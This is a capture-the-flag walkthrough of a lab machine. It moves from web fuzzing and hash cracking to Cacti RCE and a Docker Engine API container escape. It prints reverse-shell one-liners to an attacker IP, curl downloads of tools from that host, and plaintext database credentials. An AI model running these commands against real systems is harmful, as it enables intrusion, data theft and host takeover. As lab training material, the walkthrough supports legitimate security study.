# MonitorsFour - Easy

```sh
sudo vim /etc/hosts
# add monitorsfour.htb

nmap -T4 -p- -A -Pn -v monitorsfour.htb
```

* open ports & services:

    * 80/tcp - http - nginx
    * 5985/tcp - http - Microsoft HTTPAPI httpd 2.0

* the webpage is for a networking solution; the footer of the webpage provides an email id 'sales@monitorsfour.htb'

* there is a login page at '/login', and it has a 'forgot password' option at '/forgot-password', which sends the reset instructions to an email id

* checking the source code of the login page, we can see the form uses a POST call to an API endpoint at '/api/v1/auth'

* similarly, the source code of the forgot password page shows a POST call to an API endpoint '/api/v1/reset' is used

* so we can fuzz for any other API endpoints provided by the webapp if needed

* web scan:

    ```sh
    gobuster dir -u http://monitorsfour.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx,js,json,docx,pdf,cgi,sql,xml,tar,gz,db -t 25
    # dir scan

    ffuf -c -u 'http://monitorsfour.htb' -H 'Host: FUZZ.monitorsfour.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 138 -s
    # subdomain scan
    ```

* ```gobuster``` provides a few additional pages:

    * /contact - this page gives a warning for file not found and discloses the paths ```/var/www/app/views/contact.php``` & ```/var/www/app/Router.php```, which is unusual as this is detected to be a Windows machine - so a possible container could be running the webapp

    * /controllers - this page is 403 Forbidden

    * /static - 403 Forbidden

    * /user - this gives an error - ```{"error":"Missing token parameter"}``` - this looks like an API endpoint response

    * /views - this gives the bare view of the homepage

* also, subdomain scan using ```ffuf``` gives us an additional subdomain 'cacti.monitorsfour.htb' - update this entry in ```/etc/hosts```

* visiting this subdomain leads to 'http://cacti.monitorsfour.htb/cacti/', a login page for Cacti software, version 1.2.28

* Googling for vulns associated with Cacti 1.2.28 leads to [CVE-2025-24367](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC) - an authenticated graph template RCE exploit

* as this is an authenticated exploit, we need creds to proceed; attempting default creds like 'admin:admin' and 'cacti:cacti' do not work

* we can check the '/user' endpoint on the main domain from earlier and attempt to fuzz it:

    ```sh
    curl 'http://monitorsfour.htb/user'
    # {"error":"Missing token parameter"}

    curl 'http://monitorsfour.htb/user?token=test'
    # {"error":"Invalid or missing token"}
    ```

* using 'token' parameter gives a different error, so we can attempt fuzzing now; we do not know what kind of value the 'token' parameter is expecting so we can fuzz with different types of wordlists:

    ```sh
    ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u 'http://monitorsfour.htb/user?token=FUZZ' -fs 36 -s
    # this gives responses for '0' and '00'

    curl 'http://monitorsfour.htb/user?token=0'
    # this gives API response with creds

    # generate a wordlist for negative numbers and positive numbers
    for i in $(seq -100 100); do echo $i >> tokens.txt; done

    # test with numbers wordlist for fuzzing
    ffuf -w tokens.txt -u 'http://monitorsfour.htb/user?token=FUZZ' -fs 36 -s
    # this also gives response only when 'token=0'
    ```

* checking the fuzzing attempts using ```ffuf```, we get a response from the page only when the token value is set to 0, and the JSON response includes employee details for four employees -

    * admin - Marcus Higgins
    * mwatson - Michael Watson
    * janderson - Jennifer Anderson
    * dthompson - David Thompson

* the JSON response also includes MD5 hashes for each user - we can attempt to crack it:

    ```sh
    vim md5hashes.txt

    hashcat -a 0 -m 0 md5hashes.txt /usr/share/wordlists/rockyou.txt --force
    ```

* ```hashcat``` cracks the hash for 'admin' user to give plaintext 'wonderful1'

* we can attempt to use the creds 'admin:wonderful1' in the Cacti login page, but this does not work

* however, if we attempt to use 'marcus' as a username (as it is the name of the admin user) with the password 'wonderful1', it works, and we are able to access the Cacti console page

* we can now attempt the exploit for CVE-2025-24367:

    ```sh
    nc -nvlp 4444
    # setup listener

    sudo python3 exploit.py -u marcus -p wonderful1 -i 10.10.14.27 -l 4444 -url http://cacti.monitorsfour.htb
    # run with sudo as it uses port 80 to host HTTP server
    # this gives shell
    ```

* in reverse shell:

    ```sh
    id
    # www-data

    which python

    which python3
    # python and python3 not available

    which script
    # script is available

    # we can stabilise shell using script instead
    
    /usr/bin/script -qc /bin/bash /dev/null
    # Ctrl+Z to background shell
    stty raw -echo; fg
    # press Enter twice
    export TERM=xterm
    stty cols 132 rows 34

    pwd
    # /var/www/html/cacti

    ls -la /var/www/
    # enumerate web files

    ls -la /var/www/app
    # check webapp files

    cat /var/www/app/.env
    # includes MariaDB creds

    ss -ltnp
    # this does not show MariaDB running on port 3306

    ls -la /
    # includes '.dockerenv'

    cat /start.sh
    # starts PHP and nginx

    hostname
    # randomly generated hostname

    ip a s
    # shows internal IP 172.18.0.2/16

    cat /etc/passwd
    # one user 'marcus' is found

    ls -la /home

    ls -la /home/marcus

    cat /home/marcus/user.txt
    # user flag

    su marcus
    # 'wonderful1' does not work
    ```

* checking the '.env' file gives us the creds 'monitorsdbuser:f37p2j8f4t0r' for the DB 'monitorsfour_db' in MariaDB, running on default port 3306

* however, ```ss -ltnp``` shows that there is no service running on port 3306, however it mentions port 46479 listening on '127.0.0.11' and port 9000 open

* also, enumeration shows that we are in a Docker container with one more user 'marcus' on the box

* it is possible that this user can be used to escalate our privileges to root on container and to break out of the container if needed

* enumerate using ```linpeas``` - fetch script from attacker:

    ```sh
    cd /tmp

    # wget is not on box, so using curl
    curl http://10.10.14.27:8000/linpeas.sh -o linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.6.87.2-microsoft-standard-WSL2
    * ```/usr/bin/nsenter``` found for containers
    * port 9000 is used for hosting the webapps, as seen from ```/etc/nginx/sites-enabled/default```
    * cacti config file at ```/var/www/html/cacti/include/config.php``` discloses MySQL DB creds 'cactidbuser:7pyrf6ly8qx4'

* it is possible that the DB service is running on the main host, and not the Docker container, so we need to scan the other IP addresses in the network range 172.18.0.0/16 (as the Docker container is having IP 172.18.0.2/16) to check further

* ```nmap``` is not found on the box, so we can fetch it from attacker and run it:

    ```sh
    curl http://10.10.14.27:8000/nmap -o nmap

    chmod +x nmap

    ls -la /etc/services
    # port-service file not found, we need this too

    curl http://10.10.14.27:8000/nmap-services -o nmap-services
    # copy of '/etc/services'

    ./nmap 172.18.0.0/24
    # start by scanning smaller /24 subnet, as /16 will take time
    ```

* the ```nmap``` scan works, and we get a couple of hosts on the 172.18.0.0/24 network:

    * 172.18.0.1 has 80/tcp (http), 111/tcp (sunrpc), and 3306/tcp (mysql) open
    * 172.18.0.3 (mariadb.docker_setup_default) has 3306/tcp (mysql) open

* we can now connect to the DB host with the DB creds found earlier to check for any secrets:

    ```sh
    mysql -u monitorsdbuser -pf37p2j8f4t0r -h 172.18.0.3 -e "show databases;"
    # this includes a non-default DB 'monitorsfour_db'

    mysql -u monitorsdbuser -pf37p2j8f4t0r -h 172.18.0.3 -D monitorsfour_db -e "show tables;"
    # shows multiple tables
    # we can check the 'users' table

    mysql -u monitorsdbuser -pf37p2j8f4t0r -h 172.18.0.3 -D monitorsfour_db -e "select * from users;"
    # this is the same data as seen earlier from the '/user' endpoint

    # we can attempt to connect to the 'cacti' DB instead using the config creds
    
    mysql -u cactidbuser -p7pyrf6ly8qx4 -h 172.18.0.3 -e "show databases;"
    # this shows 'cacti' DB

    mysql -u cactidbuser -p7pyrf6ly8qx4 -h 172.18.0.3 -D cacti -e "show tables;"
    # this too shows multiple tables
    # cacti stores creds in 'user_auth' table

    mysql -u cactidbuser -p7pyrf6ly8qx4 -h 172.18.0.3 -D cacti -e "select * from user_auth;"
    # this gives hashes for 'admin' & 'marcus'
    ```

* the MySQL 'cacti' DB on 172.18.0.3 gives us the hashes for 'admin' & 'marcus' - we can attempt to crack these bcrypt hashes:

    ```sh
    vim hashes.txt

    hashcat -a 0 -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --force
    ```

* this cracks 'marcus' hash to 'wonderful1' which is already known, but cannot crack the 'admin' hash

* we can also attempt to connect as 'marcus' to the main host via ```evil-winrm```, since the WinRM port 5985 is open, but this does not work, so it is possible that we may have to login as another user

* at this point, we can [check with manual enumeration for any clues, followed by any ways to breakout of the Docker container](https://exploit-notes.hdks.org/exploit/container/docker/docker-escape/):

    ```sh
    sudo -l
    # sudo not found

    which docker
    # docker not found

    history

    grep --color=auto -rnwiIe "PASSW\|PASSWD\|PASSWORD\|PWD" --exclude-dir={proc,sys,dev,run,tmp} / 2>/dev/null
    # check for any cleartext passwords

    # check network config

    ip addr

    cat /etc/hosts

    cat /etc/resolv.conf
    # this mentions an IP 192.168.65.7
    ```

* the ```/etc/resolv.conf``` file mentions an IP address '192.168.65.7' - it is commented out, but we can check if it is accessible using a quick scan:

    ```sh
    ./nmap -p- 192.168.65.7
    ```

* the ```nmap``` scan shows that ports 53, 2375, 3128 & 5555 are open

* out of these ports, port 2375 is of interest as it is the default unencrypted port for the Docker daemon or the Docker Engine API

* checking from another walkthrough, I found that an alternative way to find this info was to check for the hostname ```host.docker.internal``` - a hostname that resolves to the host, within the container:

    ```sh
    curl -v http://host.docker.internal:2375/version
    # this attempted to access 192.168.65.254
    # which gave a new internal network to check for
    ```

* we can continue to check '192.168.65.7' further by [enumerating Docker engine](https://hackviser.com/tactics/pentesting/services/docker):

    ```sh
    curl -v http://192.168.65.7:2375/version
    # check docker version info

    curl -v http://192.168.65.7:2375/containers/json
    # list all containers
    # includes containers for webapp, mariadb

    curl -v http://192.168.65.7:2375/images/json
    # list all images

    curl -v http://192.168.65.7:2375/networks
    # network info

    curl -v http://192.168.65.7:2375/volumes
    # volume info

    # we can alternatively run this commands via 'docker'
    # but this needs the 'docker' binary and an exposed docker socket
    ```

* listing the Docker images shows 2 images - 'docker_setup-nginx-php' and 'alpine'

* as we have access to the Docker API, we can check for ways to abuse the API access

* Googling for Docker API exploits leads to multiple blogs such as [this one](https://exploit-notes.hdks.org/exploit/container/docker/docker-engine-api/) - we are able to create the container but this payload does not work (it did not work because the payload given was for Linux and not for Windows, we need to mount the C drive)

* Google also shows CVE-2025-9074, a container escape vulnerability, for which the payloads given in these exploits work:

    * [CVE-2025-9074 PoC](https://github.com/BridgerAlderson/CVE-2025-9074-PoC/blob/main/cve-2025-9074.sh)
    * [CVE-2025-9074 exploit script](https://github.com/j3r1ch0123/CVE-2025-9074/blob/main/exploit.py)

* we can use the payload for reference and create a malicious container using any of the two images, and execute a reverse shell one-liner for RCE on the actual host:

    ```sh
    # on attacker
    nc -nvlp 5555
    # setup listener for reverse shell
    ```

    ```sh
    cat <<EOF > test.json
    {
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.27 5555 >/tmp/f"],
    "HostConfig": {
        "Binds": ["/mnt/host/c:/host_root"]
    }
    }
    EOF
    # this creates the JSON file for container config
    # other reverse shell one-liners did not work and ended right after connection
    # and alpine does not have '/bin/bash' by default, so using '/bin/sh'

    curl -X POST -H "Content-Type: application/json" -d @test.json http://192.168.65.7:2375/containers/create
    # create the container
    # this returns a container ID, which needs to be used to start the container

    curl -X POST http://192.168.65.7:2375/containers/366b9137f2b68081c9dfe814e6e6061cca04c120023279ca4c2c5e94fdf39883/start
    # start the container
    ```

    ```sh
    # we get reverse shell on our listener
    id
    # root

    ls -la
    # we are in root directory of the host, and this has access to the Windows system

    ls -la /host_root
    # C drive of Windows filesystem

    cat /host_root/Users/Administrator/Desktop/root.txt
    # root flag
    ```
